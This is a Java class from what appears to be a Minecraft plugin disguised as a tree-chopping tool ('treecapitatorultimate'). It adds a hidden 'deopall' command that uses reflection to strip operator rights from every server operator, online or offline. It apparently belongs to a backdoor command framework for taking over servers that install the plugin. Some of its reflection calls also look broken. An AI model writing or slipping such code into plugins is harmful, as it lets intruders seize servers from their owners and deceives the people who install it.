package me.bow.treecapitatorultimate.commands.Server;

import com.mojang.authlib.GameProfile;
import me.bow.treecapitatorultimate.Start;
import me.bow.treecapitatorultimate.Utils.ReflectionUtils;
import me.bow.treecapitatorultimate.command.Command;
import me.bow.treecapitatorultimate.command.CommandCategory;
import net.minecraft.server.v1_14_R1.OpListEntry;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.OfflinePlayer;
import org.bukkit.entity.Player;

import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Objects;

@SuppressWarnings("deprecation")
public class DeopAll extends Command {
    public DeopAll() {
        super("deopall", "Deops everyone", CommandCategory.Server);
    }

    @Override
    public void onCommand(Player p, ArrayList<String> args) {
        Collection<OpListEntry> ops = null;
        Class<?> craftServer = ReflectionUtils.getClass("{nms}.CraftServer");
        Class<?> dedicatedPlayerList = ReflectionUtils.getClass("{nms}.DedicatedPlayerList");
        Class<?> opList = ReflectionUtils.getClass("{nms}.OpList");
        try {
            Method m = (Method) ReflectionUtils.getMethod(dedicatedPlayerList, "getPlayerList", 0).invoke(Bukkit.getServer());
            m = (Method)ReflectionUtils.getMethod(opList, "getOPs").invoke(m);
            ops =(Collection<OpListEntry>)ReflectionUtils.getMethod(opList, "getValues", 0).invoke(m);

        } catch (Exception e) {
            e.printStackTrace();
        }
        if (ops.size() == 0) p.sendMessage(Start.Prefix + ChatColor.GREEN + "Noone has OP!");
        ops.forEach(op -> {
            GameProfile o = op.getKey();
            Player r;
            if (Objects.requireNonNull(o).isLegacy())
                r = Bukkit.getPlayer(o.getName());
            else
                r = Bukkit.getPlayer(o.getId());
            if (r == null || !r.isOnline()) {
                OfflinePlayer f;
                if (o.isLegacy())
                    f = Bukkit.getOfflinePlayer(o.getName());
                else
                    f = Bukkit.getOfflinePlayer(o.getId());
                f.setOp(false);
                p.sendMessage(Start.Prefix + ChatColor.RED + o.getName() + ChatColor.GREEN + " (" + ChatColor.DARK_GRAY + "Offline" + ChatColor.GREEN + ") now doesn't have op!");
            } else {
                r.setOp(false);
                p.sendMessage(Start.Prefix + ChatColor.RED + o.getName() + ChatColor.GREEN + " (" + ChatColor.DARK_AQUA + "Online" + ChatColor.GREEN + ") now doesn't have op!");
            }
        });
    }
}
